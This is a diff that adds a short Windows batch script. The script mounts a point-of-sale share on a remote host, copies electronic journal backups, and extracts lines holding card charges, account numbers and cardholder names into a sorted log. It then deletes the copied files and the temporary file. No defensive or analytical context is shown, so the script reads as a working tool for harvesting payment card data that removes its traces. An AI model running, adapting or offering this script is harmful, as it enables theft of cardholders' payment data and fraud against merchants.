@@ -1,0 +1,12 @@
+net use z:\ \\%1\cpos
+copy z:\app\ej_backup\*.* .
+net use z: /delete
+type *.pos | find /n "VISA CHARGE" >> temp
+type *.pos | find /n "MASTERCARD CHARGE" >> temp
+type *.pos | find /n "AMEX CHARGE" >> temp
+type *.pos | find /n "DISCOVER CHARGE" >> temp
+type *.pos | find /n "ACCT# (M)" >> temp
+type *.pos | find /n "CARD HOLDER:" >> temp
+sort /+1 temp >> stripped.log
+erase temp
+erase *.pos
